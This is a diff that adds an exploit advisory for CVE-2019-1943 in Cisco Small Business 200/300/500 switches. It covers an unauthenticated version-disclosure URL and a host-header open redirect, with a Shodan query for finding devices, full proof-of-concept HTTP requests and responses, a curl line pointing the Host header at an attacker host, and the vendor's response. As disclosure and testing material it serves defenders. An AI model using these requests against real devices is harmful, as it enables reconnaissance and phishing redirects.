@@ -1,0 +1,121 @@
+# Exploit Title: CISCO Small Business 200, 300, 500 Switches Multiple Vulnerabilities.
+# Shodan query: /config/log_off_page.html
+# Discovered Date: 07/03/2014
+# Reported Date: 08/04/2019
+# Exploit Author: Ramikan 
+# Website: http://fact-in-hack.blogspot.com
+# Vendor Homepage:https://www.cisco.com/c/en/us/products/switches/small-business-300-series-managed-switches/index.html
+# Affected Devices:  The affected products are all Cisco Small Business 200, 300, and 500 Series Managed Switches with the web management interface enabled, 
+# Tested On: Cisco C300 Switch
+# Version: 1.3.7.18
+# CVE : CVE-2019-1943
+# CVSS v3: 4.7 (AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N)
+# Category:Hardware, Web Apps
+# Reference : https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190717-sbss-redirect
+
+*************************************************************************************************************************************
+
+Vulnerability 1: Information Gathering
+
+*************************************************************************************************************************************
+
+Unauthenticated user can find the version number and device type by visiting this link directly.
+
+Affected URL:
+
+/cs703dae2c/device/English/dictionaryLogin.xml
+
+*************************************************************************************************************************************
+
+Vulnerability 2: Open Redirect due to host header.
+
+*************************************************************************************************************************************
+
+Can change to different domain under the host header and redirect the request to fake website and can be used for phishing attack also can be used for domain fronting.
+
+Normal Request
+
+GET / HTTP/1.1
+Host: 10.1.1.120
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+
+Normal Response
+
+HTTP/1.1 302 Redirect
+Server: GoAhead-Webs
+Date: Fri Mar 07 09:40:22 2014
+Connection: close
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Type: text/html
+Location: https://10.21.151.120/cs703dae2c/
+
+<html><head></head><body>
+                        This document has moved to a new <a href="https://10.1.1.120/cs703dae2c/">location</a>.
+                        Please update your documents to reflect the new location.
+                        </body></html>
+*************************************************************************************************************************************
+POC 
+*************************************************************************************************************************************
+
+Host Header changed to different domain (example google.com).
+
+Request:
+
+GET /cs703dae2c HTTP/1.1
+Host: google.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: activeLangId=English; isStackableDevice=false
+Upgrade-Insecure-Requests: 1
+
+
+Response:
+
+HTTP/1.1 302 Redirect
+activeLangId=English; isStackableDevice=falseServer: GoAhead-Webs
+Date: Fri Mar 07 09:45:26 2014
+Connection: close
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Type: text/html
+Location: http://google.com/cs703dae2c/config/log_off_page.htm
+
+<html><head></head><body>
+                        This document has moved to a new <a href="http://google.com/cs703dae2c/config/log_off_page.htm">location</a>.
+                        Please update your documents to reflect the new location.
+                        </body></html>
+
+
+The redirection is happening to http://google.com/cs703dae2c/config/log_off_page.htm. The attacker need to be in same network and should be able to modify the victims request on the wire in order to trigger this vulnerabilty.
+
+*************************************************************************************************************************************
+Attack Vector:
+*************************************************************************************************************************************
+Can be used for domain fronting.
+
+curl -k --header "Host: attack.host.net" "domainname of the cisco device"
+
+
+*************************************************************************************************************************************
+Vendor Response:
+*************************************************************************************************************************************
+
+Issue 1:
+Due to the limited information given out, we are not considering it a vulnerability as such. Still, it would be better if it was not happening, so, we will treat it as a hardening enhancement.
+
+Issue 2:
+The developers won't be able to provide a fix for this in the short term (90 days), so, we are planning to disclose this issue through an advisory on July 17th 2019.
+
+We have assigned CVE CVE-2019-1943 for this issue.
+
+Reference: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190717-sbss-redirect
+*************************************************************************************************************************************
